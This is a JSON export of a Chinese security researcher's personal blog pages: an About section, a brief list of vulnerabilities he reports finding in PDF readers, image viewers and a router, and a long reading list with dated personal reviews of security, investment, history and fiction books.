{"meta":{"title":"giantbranch's blog","subtitle":"忘掉掌声，按自己的方式，继续前行，跑过一生","description":"old blog is http://oldblog.giantbranch.cn/","author":"giantbranch","url":"https://www.giantbranch.cn"},"pages":[{"title":"About Me","date":"2018-01-13T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"about/index.html","permalink":"https://www.giantbranch.cn/about/index.html","excerpt":"","text":"At School一个当初报硬件专业，最后被调剂到信息安全专业的一个人 从沉迷游戏，到不玩游戏，再到web开发，顺而掉入web安全之坑，再而挑战自己，挑战二进制与逆向 暨南大学校园安全团队Xp0int创始人 当年跟另一个同学一起创立的，其实算是民间团队，没有什么资金啥的，不过后来逐渐地有成绩了就越来越受到学校的重视了 Now安全研究员 关注二进制漏洞分析，利用与挖掘及前沿技术研究，规则添加等 培训ctf 逆向，pwn，pwn高级等课程，现在基本也没去培训了 自己继续瞎几把研究。。。 杂货店 其实世界很精彩，还有其他东西学习，所以我业余也会记录学习一点其他东西，搞了个非计算机博客，文章比较少，暂不公开，厉害的黑客，我知道你们能找出来吧？ 如果我的文章对你有帮助"},{"title":"tags","date":"2017-12-12T07:35:24.000Z","updated":"2023-10-13T13:14:33.138Z","comments":true,"path":"tags/index.html","permalink":"https://www.giantbranch.cn/tags/index.html","excerpt":"","text":""},{"title":"vulanalysis","date":"2018-03-06T03:39:03.000Z","updated":"2023-10-13T13:14:33.138Z","comments":true,"path":"vulanalysis/index.html","permalink":"https://www.giantbranch.cn/vulanalysis/index.html","excerpt":"","text":""},{"title":"","date":"2018-03-06T01:01:18.000Z","updated":"2023-10-13T13:14:33.138Z","comments":true,"path":"vulfound/index.html","permalink":"https://www.giantbranch.cn/vulfound/index.html","excerpt":"","text":"这个页面记录一下自己挖掘过的二进制漏洞（很水，大牛勿喷） 本地漏洞PDF阅读器迷你PDF阅读器(MINIPDF) v2.16.9.5：1个uaf，2个拒绝服务 极速PDF阅读器(v2.2.6.1001版本,v3.0.0.1006版本都存在)：2个拒绝服务 图片查看器人人极速相册(v2.7): 2个堆溢出，2个拒绝服务，1个double free 2345图片查看器：1个整数溢出漏洞 IOT漏洞路由器移动和路由器：3个XSS，一个命令注入（3个参数都存在注入），一个溢出（3个参数都存在溢出）"},{"title":"我所读过的书籍","date":"2018-12-01T00:00:00.000Z","updated":"2023-10-13T13:14:33.138Z","comments":true,"path":"book/index.html","permalink":"https://www.giantbranch.cn/book/index.html","excerpt":"","text":"在IT行业里，当我们问这个方向如何入门的时候，通常都会有人推荐一些书，或者直接来个书单，但是这里边鱼龙混杂，有些是直接转载的还好，有些是推荐了自己压根没看过，可能只知道书名的书，其实这样不太好，没有看过的毕竟不好评论。所以我接下来记录一下自己所看过的书籍吧，这个会不断更新，希望这个文章能够永远更新下去，就像git那样，我可以不断地提交，当我上千本书的时候，可能并不是非常牛逼的那一个，但肯定是自己都为自己点赞的那一个。 当然我读过的书不可能全部都放上来，有些读了之后忘了，有些在图书馆读的或者借的，但是我印象最深的书肯定都在下面了，所以除了下面的书，你应该读更多的书，找更多的资料。 从2019年1月起，我开始对非计算机的书籍记录的同时，写上自己感受总结啥的，后面加上时间，这样子感觉还是不错的。 网络安全相关IT基础，编程基础，安全基础《深入理解计算机系统》 没看完。。。《深入理解Windows操作系统》 没看完。。。《UNIX环境高级编程》大学linux的推荐书，买了翻了一点吧。。。《TCP/IP详解（卷1：协议）》这个我能说看了本盗版书么《程序员的自我修养：链接、装载与库》这个挺不错的，就是看完一次后忘了很多。。。《安全技术经典译丛·深入浅出密码学：常用加密技术原理与应用》还行，当年上密码学课程参考过这本书，用python编程去实现des，aes以及md5算法《架构之美》看了一点，不能看下去。。。《C++黑客编程揭秘与防范》这个真的不错的，可以学到不少MFC，C++，木马的一些知识，现在应该第二版了 web安全《Python黑帽子:黑客与渗透测试编程之道》这个可以说强烈推荐吧，反正我是实践完了：https://blog.csdn.net/u012763794/article/details/50612756《Web前端黑客技术揭秘》还行吧《白帽子讲Web安全》还是比较全面的《安全技术经典译丛：SQL注入攻击与防御（第2版）》还行，不过还是多实践，比如sqli-labs也是不错的实践的项目《xss跨站脚本攻击剖析与防御》专注于xss，也还行 windows与linux二进制与逆向《逆向工程核心原理》极力推荐！！！写得相当好，从基础到深入都有了，这本书不需要太深的C，C++编程基础《C++反汇编与逆向分析技术揭秘》这个认真看并实践可以了解到C++与汇编的一些对应关系，当时由于已经实践过，所以只是过了一遍《加密与解密》我看的是第三版，这个内容也比较丰富，不过也大同小异，印象中到后面的一些章节没去看了。《IDA权威指南》写IDAPYTHON插件的时候翻了对应的章节，当工具书不错的《0day安全：软件漏洞分析技术（第2版）》当时在有路网便宜搞了本二手书，基本实践完，挺不错的，可以开启漏洞分析之路《漏洞战争：软件漏洞分析精要》这个就是实例分析，你可以接触到不同的漏洞，不同的漏洞分析方法，部分有利用，这个我搞到安卓那里停止了，有机会继续干完，已经看完了，部分内容由于环境及懒的原因没有实践《Python灰帽子–黑客与逆向工程师的Python编程之道》这个也是不错的，利用脚本来搞逆向，学到也不少，我实践了绝大多数：https://blog.csdn.net/u012763794/article/details/52174275 ，后面几章没有搞《恶意代码分析实战》这是也是才实践了前面几章，有空得完成《格蠹汇编：软件调试案例锦集》只实践了第一讲。。。， 已经看到12章了，你会发现windbg是一个多么牛逼的调试器 安卓《Android软件安全与逆向分析》现在看来，比较基础，没啥太大的收获 其他软技能类的好书这个其实跟下面是一样的，由于历史遗留问题，没有合并到下面 《程序员健康指南》长久才是王道啊《穷爸爸富爸爸》哈哈，我们应该也要学投资，什么是负债，什么是资产《少有人走的路》这个当初大学看过，忘得差不多了，不过还是一个好的评价《把时间当做朋友》这个算是我读书之路的开始吧，从此我从一个除了教科书都不读的人，变成一个偶尔读读书的人，影响还是挺大的《思考的乐趣：Matrix67数学笔记》还好吧，可以将数学搞成有点趣味的东西，印象中还是没有看完 人文，历史，小说等其他书籍《家，春，秋》这是巴金的长篇小说中的《激流三部曲》，这是我第一次读这么长的小说，竟然读完了，在了解历史的同时，也体会到了里面各种人物的悲剧，体会作者想表达的各种情感（想起初高中的语文题，哈哈），或许我们只是像小说里面的某些人一样，被某些东西约束着，苟且地活着 《围城》这个最经典的就是外面的人想进来，里面的人想出去，真的很有感触 《心里暗示力》这是不断为了说明暗示有多么强大的一本书 《浪潮之巅》讲各种互联网浪潮下的公司的一些历史的，不错的 《大数据时代:生活、工作、思维的大变革》这个就是主要讲不要关注因果关系，要关注相关关系 《追风筝的人》两个少年——阿米尔和哈桑，一个富家少年与家中仆人，其实家中的仆人——哈桑其实是他同父异母的兄弟，父亲向阿米尔隐瞒了事情的真相，偷走了哈桑本应得到的父爱与社会认同感。 《撒切尔夫人传》一般般，不过撒切尔夫人感觉是专为政治而生的，当然她的成功除了自身努力还得归功于支持她而且有钱的丈夫。偏向了政治，当然家庭方面的投入就少了。——20190109 《世界文明大系：犹太文明》犹太人我感觉主要是他们的宗教很厉害，而且政教合一，非常重视教育，跟我们的一些儒家、道家什么的也有相似之处，这书从他们的起源讲到现代了，了解犹太人挺不错的，由于懒惰断断续续读了几个月。。。（既然教育这么重要，说明学习还是很重要的，继续加油吧——20190430） 《深度工作》 深度工作就是在无干扰的状态下进行专注的职业活动，使个人的认知能力达到极限。重要的就两点，没有干扰和专注，现在我们的社交软件就很打扰了，所以想专注还是得手机放一边并静音；另外一个专注其实也得需要培养。——20190511 《原则》这本书感觉被吹上天了，期望越大，失望越大。除了里面一直提到的创意择优，我印象最深的就是做到头脑极度开放，比如你能够容下两个或以上相互冲突的观点。罗曼罗兰曾说：世上只有一种英雄主义，就是在认清生活真相之后依然热爱生活。作者所说的头脑季度开放或许这也算是英雄吧。还有我们还得保持好奇心，这样我们的大脑才能不断探索，不断吸收外界的知识。在《开讲啦》的一位复旦的教师曾说过这样一个意思：保持好奇心能让你保持谦逊。——20190608 《薛兆丰经济学讲义》这本书可能没看过经济学的还可以看看，感觉就是看了很多个小故事，但是也是有一点点收获吧，比如纠正我们的有些偏见，看到一些关于经济学周期的东西，怎么才能帮助穷人等等。其实每看完一小节，没有让你看下一节的冲动，所以这本书我看了很久。。。——20190831 《债务危机》作者在书中说的大型债务危机有6个阶段：周期早期、泡沫阶段、触顶、萧条、去杠杆以及正常化。还有当然就是这些阶段的一些特点，或者说现象，对于我们理解当年的经济，指导我们的投资的大方向，确实会有一些作用，但是现实的情况更加复杂，所以需要具体分析，思考。总的来说还是能学到一些东西，但是需要注意的是里面的比较多专业术语，还是可能是美国那边的表达，跟中国这边有所差异。——20191208 《说话体现格局，决定结局》这本书如果按实体书算的话有256页，还是挺薄的感觉，由于拖延症，本来想着一个星期就可以读完了，结果12月16日开始读，12月26日才读完。当时可能读不进去什么，就找了这个本书读，当时一看可能偏鸡汤的，那就它了吧，这本书其实没有太多格局的东西，就是关于做人，沟通，职场相关的多一点，摘录一些关键点：非暴力沟通，该拒绝的时候一定要拒绝（没能力就不要逞强，可委婉，可给解决方案、方法等），不要为了出风头而出风头，不八卦，不打听别人的秘密。——20191227 《5G时代：什么是5G，它将如何改变世界》这是一个5G的科普书籍。第一章你会感觉是在读历史，上来先说人类社会的6次信息革命，分别是语言的发明，文字的发明，纸和印刷术的发明，无线电的发明，电视的发明，互联网的发明。整体的发展方向是信息传递的更准确，更方便，更远距离，更快，更丰富，可进行双向，多人交互地传输，作者把5G将会带来具有低时延，高速度的万物互联网称为智能互联网，也将其认为是第7次信息革命。之后回顾了下1G-4G，简单说了下5G的技术。其实我印象更深的是作者非常关注5G网络的安全，毕竟5G应用在智能交通、医疗健康、智能家居、智能工业、智能物流、智能农业等领域，一旦控制中心被黑客控制，后果那是不堪设想。到最后一章就是对未来的展望了，说6G将是技术演进而非革命，就像4G只是比3G的速度更快，解决3G的速度问题。还探寻了信息传输的未来，怎样可以更快，能源存储会往哪个方向发展。最后的社会伦理道德我感觉作者是看了尤瓦尔·赫拉利的《人类简史》，就是人与芯片相结合，你说这是人还不是人呢？伦理道德当然会随着科学技术的改变而改变，现在我们连同性恋都可以慢慢接受了，还有什么接受不了呢？——20191229 《莫泊桑短篇小说精选》这个从20191230开始看，一开始只是看了一丢丢，工作日也没花啥时间看，元旦放假就看跨年的演讲去了（罗胖的《时间的朋友》：时间太长就只是看了文稿了，还有就是广东卫视的《更好的明年》），所以主要看的都是在这个周末，刚好一周看完。看下来印象最深的还是第一篇《羊脂球》，应该也是收录的小说中最长的，妓女羊脂球没人看得起，但是一群人吃人家的东西，没人表示感谢，而且说服她跟普鲁士军官发生性关系，一群人从而可以坐上马车重新上路，却没人看得起她，当然也没有感谢了。我读的这个kindle电子书将一些小说分到了一些篇章里面，分为普法战争、悲喜职员、乡村轶事、爱与情欲、怪诞故事五个篇章。普法战争篇章包含了上面的《羊脂球》，也有为报仇而杀死掉落单的普鲁士士兵的《米隆老爹》，在悲喜职员篇章中描写了一些有悲有喜的人，当然也有由喜转悲的故事，我们熟悉的《项链》也在其中，也有贫居闹市无人问，富在深山有远亲这种感觉的《我的叔叔于勒》，乡村轶事篇章感觉说的事情还是比较普通，爱与情欲篇章就是说了一些爱情故事，有忠贞不渝的，也有单相思的。怪诞故事篇章就说了一些都是无法解释，甚至有些惊悚的故事。附录中还有莫泊桑在患精神疾病，在近乎幻觉和疯癫的状态下，完成的奇幻文学杰作《奥尔拉》，写得有点恐怖，或许写出了精神病患者的内心吧。——20200105 《打造超人大腦》这本书是台湾人写的，而且是github开源的，最开始在2019年7月30日开始读，边读边记录，断断续续，书不太长，但是由于拖延，懒惰，拖到今天读完《莫泊桑短篇小说精选》才来完成它，这也是为什么写下记录跟《莫泊桑短篇小说精选》是同一天了。里面印象深刻的是如何快速读书，其实里面说的即时复述确实很重要，这样才能记得牢固。还有里面提到的语音写作也是不错的，免费的推荐有道云笔记里面的语音速记，就是能让你再短时间内写出很多文字，当然需要自己后期修改，增添东西。后面作者不推荐使用类比思维去思考问题，推荐使用第一性原理加速学习：一层层剥开事物的表象，看到里面的本质，然后再从本质一层层往上走。——20200105 《中央帝国的财政密码》这本书是《炒股拌饭》公众号作者推荐的，豆瓣评分8.4分，还不错，这是三部曲的其中一本，还有哲学密码和军事密码。作者以中国历代王朝为经，以现代经济学理论为纬，去剖析从秦汉到明清的财政制度，你会发现各个朝代基本都是运行在从财政建立到崩溃的轮回当中，也是朝代更替的过程。这是一本经济与历史相结合的书籍，收获不少，也挺有趣的。其实核心是围绕政府的三大敛财手段（分别是国有企业、公有土地制度、垄断货币发行，当时可真敢写啊~）去展开，分别追溯到汉武帝建立的国有体制，北魏的土地国有制改革，还有垄断货币发行这个应该很早了，只不过之前可能是铜钱什么的，由于原材料，铸造效率等因素，没办法制造很多，而纸币就好造多了，可以悄无声息地从民间获取财富，而早在宋代就因为政府疯狂印钞，导致超级通货膨胀。还是一个核心的点就是认识到财政收支平衡的重要性，一般朝代的衰落与更替都是由于财政的崩溃引起的，因为你一旦进行军事扩张或者别人打过来被动应战，财政支出瞬间暴涨，那么你就得想办法提升财政收入，通过各种手段从民间获取财富，尤其是天灾来临，老百姓都饿得不得了的时候，那就很容易起来造反了，就可能形成内忧外患，加速帝国的灭亡。其实每个帝国来来回回都是这样子，只不过存在的时间有长有短而已。 最后摘录下书种末尾的一句话：和平时期看财政，战乱时期看军事，维稳必须靠思想控制。这也是作者写三部曲的一个解释吧——20200114 《睡眠革命》这本书其实篇幅并不长，这么久才读完，主要是懒，在家习惯没跟上就没读了，到现场复工的时候才开始读，里面最重要的就是R90睡眠法，每90分钟一个睡眠周期，一般成人建议是5个睡眠周期，也就是7.5个小时，还有就是你得先确定你得起床时间，反推7.5个小时，确定你的入眠时间，比如你7:30起床，反推就是12点入睡，当然得提前上床睡觉了。怎样更好入睡和起床呢？晚上应尽量营造良好黑暗的睡眠环境，促进褪黑素生成，而在起床后在太阳或日光灯下呆一会可以促进清醒。作者推荐的睡姿是像胎儿般睡觉：侧卧、膝盖自然弯曲、两条手臂放在身前并轻轻地交叠在一起、颈部脊柱和臀部形成一条平滑的直线。你习惯用右手，那么就左侧睡，反之亦然。——20200304 《远离迷茫，从学会赚钱开始》这本书虽然3月23日看完，但是这段文字是4月07写的，下一本书都快看完了。这本书一开始觉得没太多营养，本来没抱有太大希望，就拿来消遣一下，不过还是有些收获的，值得一读。女性理财“傻瓜菜单”：1、一份主动投资 2、一根被动防御（保险） 3、一份成长基金 4、一张健身卡 5、一根金条 6、一件首饰 7、一份不动产（初期1，2，4必选，中期1，2，3，4，5必选，未来全选）这个当然也适合我们男生了，不过我觉得首饰和金条没必要。还有就是在实现自己梦想的道路记住三点：给自己足够的时间打好基础，给自己足够的空间提升眼界，给自己足够的坚持抓住机遇。投资炒股这件事还是专业的事情交给专业的人做，交给基金经理去打理就好了。后面还有一些做人处事的道理，我记得不太清了，就不写了。——20200323 《你当像鸟飞往你的山》这是豆瓣2019年年度读书榜单最受关注图书的第二名，高达8.9分——作者是一个十七岁前从未踏入教室的大山女孩，但却能考进大学，不断地拿到奖学金，最终还到了世界顶尖学府——剑桥大学，哈佛大学，相继获得哲学硕士，历史博士。作者的童年由垃圾场的废铜烂铁铸成（甚至经常有失去生命的危险，受伤只是家常便饭），没有正常孩子那样有着无忧无虑的童年，没有去上学，父亲认为学校会教坏孩子，是洗脑，送子女上学便是将他们交给恶魔，而且父母都是不相信政府，不相信医院，连出了车祸，被火烧伤都是自己在家治疗，而且都是用叫做顺势疗法来治疗，基本都是用草本的东西吧。除了这些，作者还受到了哥哥肖恩的暴力对待以及威胁恐吓（把她的头按进马桶，掐住她的脖子叫她妓女），向父母求助完全没有用，因为父母是站在哥哥那一边的，而且此时父亲认为作者读书都读成了一个恶魔，让作者回归以前的生活与脱离这个家二选一，当然回归到那座大山是不可能的。面对自己取得的成就，塔拉在书中也只是轻描淡写（你想想一个没上过小学初中高中的人，到世界顶级大学，到历史博士，这得付出多大的努力）。教育改变了她的人生，但也在她和家人之间划出难以修复的深深裂痕。最后作者说：“你可以用很多说法来称呼这个全新的自我：转变，蜕变，虚伪，背叛。而我称之为：教育。”，对啊是教育让她逃离了那座大山，打开了一个新的世界，一个生命的无限可能，但同时也“失去”了家人。——20200410 《一个农民的亿万传奇》这本书是农民期货投资家——傅海棠口述，金融作家沈良记录整理的，虽然他是农民，但是很多投资的观念都是正确的，尤其是顺应天道，不能逆天而行。由于有农作物种植还有养猪的经验，在价格低位的时候种植或者养殖，别人舍弃的时候，自己则爱惜，这样由于别人的舍弃，供应减少，等成熟的时候当然就涨价了。还有他会不断地总结经验，关注基本面，经常实地考察，这样获取到了一手数据，才能坚定自己做多或者做空的信心，不然你就会拿不住。当然这样的成功肯定是难以复制的，不然这么多人挣钱是不可能的，亏的还是大多数，但是我们可以学习他的思想。而且期货自带高杠杆，而且还是负和博弈的市场，就是价格不涨不跌，你还得交手续费吧，到期了还要换月啥的。所以感悟还是坚持底线，不借钱投资，实践慢慢变富！——20200428 《投资中最简单的事》这次又是一本投资的书，作者在美国归来，在南方基金做投资总监，偏向价值投资，业绩还是做得不错的。作者开篇就来了三大投资理念：以实业的眼光做投资、人弃我取，逆向投资、便宜是硬道理。对啊，假如这家公司你有钱直接买下来，你会买这家公司吗？在别人都抛弃好公司，去追高垃圾股的时候，这不是你慢慢买入建仓的机会吗？假如你买的不便宜，你就会很慌，没有信心耐心持有，而且只有买得便宜，你获得的收益才能更高。还有一个就是贯穿整本书的一个理念：注重规律，不被个例迷惑。比如比尔盖茨、乔布斯、扎克伯格都是中途辍学的富豪，但是中途辍学者的平均收入都是远不如大学毕业生的，这就是规律，而辍学富豪只是个例。到股票上的规律就是高估值股票的平均回报率远不如低估值股票，即一般成长股都是高估值的，其中的大牛股只是个例，专业人士都难以抓到，何况是外行的我们，就是被你抓到了，没有重仓，也是挣不了什么钱，而抓住并重仓低位配置价值股，平均来说跑赢成长股是没问题的，这就是规律。其实就是不赌小概率时间，坚持规律投资。当然我们就算投资价值股，也要买的便宜，就像沃尔玛的东西为何这么便宜，因为买的便宜才能卖的便宜，而我们投资价值股，买的便宜，只要估值修复，肯定是能挣钱的，假如有耐心等到高估，那就收益颇丰了，这收益的多少就取决与你买得够不够便宜，仓位还比较重。最后作者也写了一部分要选择一个好行业。最后作者概括投资分析方法为3个问题：为什么认为便宜，为什么认为公司好，为什么现在买？——20200504 《两次全球大危机的比较研究》这是当时（2013年）的中央财经领导小组办公室副主任, 国务院发展研究中心党组书记刘鹤主编的一本书，当然其中有很多经济学家的参与了，比如可能大家比较熟悉的吴敬琏。现在刘鹤已经是中央政治局委员，国务院副总理、党组成员，中央财经领导小组办公室主任了，也担任中美全面经济对话中方牵头人，中美贸易战的谈判也参与其中了，所以读这本书可以知道国家对于经济发展的观点，危机预防与干预该怎么做，当然也会认识到经济周期的轮回，泡沫是怎么形成的，又是怎么破灭而导致的危机，这可能对于投资有一定的指导意义。这本书比较的是1929年的经济危机和2008年的金融危机，就像豆瓣的一些网友的评论只要看前几章即可，后面很多都是重复性的描述。两次大危机前都发生了技术革命，第一次危机前是1870年开始的电力技术革命，而第二次危机则是1980年信息技术革命，技术革命极大提高了生产力，从而出现了极度繁荣，而危机发源地政府采取放任自流的经济政策，央行还很配合地降息，物极必反，一顿加息操作就把泡沫刺破了。在两次危机前都出现了极度的收入差距过大，看数据大概是前10%的富人占有了超过45%的财富，那这样底层人民的收入的被压缩了，消费能力就不足，工厂就出现产能过剩，那就可能需要裁员，失业的人就没了收入，消费就更加不行，最终危机不就来了。更多的一些相同与不同可以看这位网友的总结。在应对政策方面，偏向于加强货币政策与宏观审慎政策之间的有效协调和配合，该凯恩斯主义还是得凯恩斯主义去刺激经济，同时监管也非常重要，美国就是因为监管跟不上金融创新，有监管的漏洞，泡沫越吹越大，导致危机的破坏力也更强。所以我们看到之前银保监会合并（应该是2018年），就是为了应为金融业的混业经营（指银行、证券公司、保险公司等机构的业务互相渗透、交叉，而不仅仅局限于自身分营业务的范围。），假如不合并就难以对其进行全面的监管，很容易有漏网之鱼。最后，危机具有强烈的再分配效应，它将导致大国权力的转移和国际经济秩序的重大变化，我们得抓住这百年未有之大变局，中国加油！——20200531 《岛上书店》这是一本畅销书，还是一本小书，实体书200多页，不算多，读书比较慢，花了5、6天读完。主人公AJ中年丧妻，他们共同开在爱丽丝岛上的岛上书店生意也不咋样，以前那个出版社销售代表也不在了，来的是一位美女阿米莉亚，丧妻后的AJ只是借酒浇愁，梦中看见妻子变成了吸血鬼，感觉作者描写主人公描写得不够悲痛。接下来他的一本抵得上整个书店所有书的限量版珍贵书籍《帧木儿》被偷了，真是坏事都集中到一起了。但有一个转折点，出去跑步带钥匙不方便，况且已经没啥值钱的东西了，所以没锁门，跑步回来发现了一个被遗弃的孩子，名字叫做玛雅。对的，他收养了他，这孩子很聪明，成为了把妻姐，妻姐父，警长还有阿米莉亚的纽带，他也喜欢上了阿米莉亚，最后成功追到手还结婚了。其实书的最后才剧透，玛雅是妻姐父与妻姐父的书迷的孩子，这书迷走投无路了就找到妻姐，妻姐就打了AJ的《帧木儿》的主意，偷了给了这书迷拿去卖，但是由于这么珍贵的书不说出来源卖不出去，而且还被玛雅的蜡笔画了一下，就没那么值钱了，书迷把这个还给了妻姐，把玛雅留在了岛上书店，自己则自杀了。幸福只是暂时的，后来AJ还得了罕见的肿瘤，把有瑕疵的《帧木儿》拍卖了也就够首期治疗，AJ还是离开了他们，阿米莉亚放弃了书店并辞去了出版社的工作，警长和妻姐接手了书店，出版社的销售代表也换了，好像故事就这样的周而复始。最后说说感受，这小说也没啥太深刻的东西，也没什么大道理，但是面对人生的苦难，我们不可改变事实，我们可以改变自己的看法，接受现实，接下来可能就会有惊喜，当然也可能继续是苦难，这就是人生啊。——20200605 《ETF全球投资指南》这是一本专门讲通过ETF投资的书籍，讲是基于美股账户的ETF投资，由于美国的ETF种类以及覆盖的范围都很广，所以可以通过美股的ETF进行全球投资。ETF的中文名为交易型开放式指数基金，通常又被称为交易所交易基金（Exchange Traded Fund，简称ETF），是一种在交易所上市交易的、基金份额可变的一种开放式基金。通过这种基金我们可以非常方便地投资各种标的，而且手续费一般都是比较低的。对于ETF，我们首先关注其流动性，也就是每日成交量，成交量大才有好的流动性，假如在牛市阶段每日成交量都不太行，熊市的时候就可能基本没有成交量了，这就相当于直接成了真股东了，哈哈。还有一个是规模，规模不行，成交量肯定也是不行的，基金公司挣不了钱，可能把这只基金给退市了，当然剩余的钱会退回的，只不过时间成本耗不起，而且退市前可能遭遇抛售，压低价格。之后就是对各种ETF进行介绍，包含持仓，收益率比较，主要跟标普500进行比较。当然也讲了ETF的溢价与折价，还有风险极大的杠杆类ETF。对于通过ETF投资全球市场，首先得选择市场，作者给出了下面的建议：1、政治稳定，社会有序 2、以市场经济为主导的 3、产业扎实，多元化 4、外汇储备稳定，不能大量减少，汇率一定要稳定 5、人口基数大，人口结构年轻是加分项。后面还介绍了更多的ETF，包括黄金，白银，石油，天然气，农产品及货币相关的ETF，最后还提了下所谓的聪明贝塔，也就是增强型ETF，这个在我国也看得比较多了，就是对指数的一个优化，搞不好是负优化哦。其实最重要的是你得理解你投资的是什么，不要跟风，要在自己的能力圈，知识圈和信息圈范围内投资，面对不熟悉或者高风险的，建议使用低仓位尝试（5%左右）。最后作者也介绍了投资组合，包括股债配置，配比当然是由你的人生阶段来定了，年轻，没啥花钱与责任就可以激进一点。总的来说投资是长跑，要持续前进才能收获成功，需要稳步前行，当然也不能一蹴而就，需要慢慢变富。——20200607 《货币战争1》这个系列书籍有5本，而且这个系列的书是饱受争议的，但是也没有影响其畅销。有人说这本书颠覆了自己的认知，也有人说里面的一些内容的真实性值得推敲，当做金融小说看就行。其实当时看完也是颠覆我的认知的，就感觉是银行家控制着整个世界，后来查了一些资料，跟同学讨论了一番之后，就变得理性一点了，银行家应该没有那么大的能耐去控制整个世界。在书中我印象最深的是梅耶·罗斯柴尔德的一句语录——只要我能控制一个国家的货币发行，我不在乎谁制定法律。这句话基于的逻辑是政府抵押国债向银行家借钱，政府得看银行家的脸色，那么控制了货币的发行就相当于间接地控制了法律的制定，那么也就不在乎谁制定法律了。在罗斯柴尔德家族控制了主要欧洲国家的金融后，就开始控制美洲的了，搞出了个私有的中央银行——美联储，根据一顿搜索私有的这个属性应该是真的，这个确实是颠覆认知的，但是是否可以通过美联储就控制了整个美国这个是值得推敲的。当然本书后面说了很多总统被暗杀，都是动了银行家等利益集团的奶酪，从常理上确实是说得通的。而且刺杀美国总统里面的人都有精神病成了刺杀美国总统的借口。后面简单提了下货币战争，就是那个国家开放资本，外国资本疯狂流入，把股市房市泡沫疯狂吹起来，之后撤资收割，等泡沫破裂又可以便宜抄底。虽然这本书内容不是很严谨，还带点阴谋论，但是看着书是挺有趣的，下次把2到5都看一下吧。—20200616 《认真地年轻 优雅地老去：杨绛传》这本书是王臣写的杨绛，她是钱钟书眼中“最贤的妻，最才的女”，从小就喜欢读书，三天不读不好过，一周不读都白活，所以从小学习优秀就不用说了，印象中杨绛错过了两次清华招生的机会，最终有一次机会进入清华借读，才遇见了一生的伴侣——钱钟书，有时候错过并不一定是坏事情。为了跟钱钟书一起，跟他一起去牛津大学留学，照顾他的饮食起居。回国后钱钟书在外地教书，一家人聚少离多，杨绛在这期间写出了剧本《称心如意》。在1951到1972年，他们俩经历了将近20多年的思想改造和下乡劳动运动中，他们没有妥协，挺了过来。后来1997年女儿钱瑗因病离去，钱瑗把一生奉献给了教育，值得敬佩。第二年，钟书也因病离她而去。杨绛只能在书中去寻找他们了，在03年出版了《我们仨》，回忆了一家三口快乐而艰难、爱与痛的日子。在年轻的时候认真地学习，认真地恋爱，老去的时候乐观地对待生活，即使孤身一人，也依旧保持读书与写作，保持自己的爱好，或许这就是王臣所说的认真地年轻，优雅地老去。——20200625 《人类群星闪耀时》我看的是读客经典文库的版本，这是初中生的推荐书目，当年小学初中高中好像也没读过课外书，现在弥补一下也未尝不可，这版本你收录了斯蒂芬·茨威格的14篇历史特写，14个他认为的决定世界历史的瞬间，里面的任务可能更多偏向作家什么的，可能跟茨威格自己是个作家有关吧，毕竟常人来说是决定世界历史的一般是一些重大发现，或者重大的科技发明与改进。分别说了以下14个历史（下面大部分文字复制于百度百科）：1、西班牙人巴尔沃亚有记载以来首先发现太平洋（当然这是西方人的视角了） 2、东罗马帝国，又名“拜占庭帝国”，因为疏忽了一座小门，奥斯曼帝国（土耳其人建立的多民族帝国）毁灭了拜占庭 3、52岁的亨德尔中风后奇迹恢复，创作了《弥赛亚》——基督徒耳熟能详的圣乐。 4、年轻上尉鲁热受到斯特拉斯堡市长的邀请，为莱茵军创作一首战歌，创作了《马赛曲》，后来成为了法国的国歌 5、由于平庸的副将格鲁希固守拿破仑的命令，拿破仑兵败滑铁卢，我对于拿破仑的分兵是感到不解的。 6、歌德写下了晚年最著名的爱情诗篇：《玛丽恩巴德悲歌》 7、苏特尔在加利福尼亚发现了黄金混合在泥沙之中，但是这给他带来了灾难，人们不再劳动而是拼命的淘金，世界各地也涌来了无数的淘金者，霸占了属于苏特尔的财产和土地，最终使苏特尔家破人亡。8、俄罗斯著名作家陀思妥耶夫斯基因参与反动的政治活动被逮捕并处于死刑，在执行死刑之际一纸官文的到来改变的死亡的命运，死刑不再，改判服役和当兵。9、在美国实业家塞勒斯·韦斯特·菲尔德立志要铺设一条连接欧美大陆的海底电报电缆，准备妥当后的首次铺设便遭遇失败，坚定的菲尔德终于在第三次铺设时成功，人人奉菲尔德为英雄。但好景不长，电缆的失灵又使愤怒的人们反过来炮轰抨击他。时隔六年，决心不减的菲尔德再次尝试终于成功。10、垂老的托尔斯泰离家出来，跟从自己的内心与理念，奔向上帝，奔向注定要去的死亡 11、挪威人阿蒙森和英国人斯科特各自率领一支探险队，看看谁能第一个到达南极点，这个我们在初中还是高中的课表就学过了，这是一个悲剧，但是斯科特还是英国人心中的英雄。 12、列宁通过德国的帮助，登上了从瑞士过境德国回到俄国的列车，重返俄国，掀起了十月革命。 13、古罗马政治家西塞罗未能挽救共和政体，还被杀害，头颅和双手被割下示众。 14、美国总统威尔逊以保障人类永久和平为梦想，但是由于其身体原因，还有各国战后的利益之争，最终和平梦想破裂。——20200719 《投资最重要的事》推荐序中说这是巴菲特读了两遍的投资书， 那这应该也是符合巴菲特的投资理念了。在本书中作者霍华德•马克斯给出了自己认为的最重要的18件事，而在描述这些事的时候，作者引用了很多投资书籍里面的文字，这说明了作者也是大量阅读了各种投资书籍，当然我们也应该多读书了。读完这本书，18个肯定是记不住的，通过目录可能可以回忆一点，但是在18件事中，我写一下我影响最深的吧（有些是多件事合在一起了）：1、学习第二层思维，进行更深度的思考，比如大家都看跌，你就要思考最坏的情况是不是已经出现了，甚至预期比实际会糟糕，那就是你买入的机会。2、一定要控制风险，这个风险其实分开了3章来写，足以说明其重要性，因为亏多了就很难翻身，而且心态会变，你能挣很多个100%，但是你只能亏一次100%。3、关注周期，事物不可能直线发展，都是有起有落。4、钟摆意识，其实每次都一样，价格高企疯狂买入，资产被低估还疯狂卖出，所以需要逆向投资，买入便宜货，这样风险也相对较，非常大概率获得成功。5、重视运气，不要把市场的上涨以为是自己牛逼。6、可能得耐心等待机会，等待被低估的机会，慢慢买入，当然也得耐心地持有，这样可能才能超越市场。总结：作者偏向于防御型投资策略，在市场上涨时跟得上，下跌时少跌，这样去不断战胜市场，确保立于不败之地。我也偏向于防御型投资策略，希望到时能够能有实际的收获。——20200804 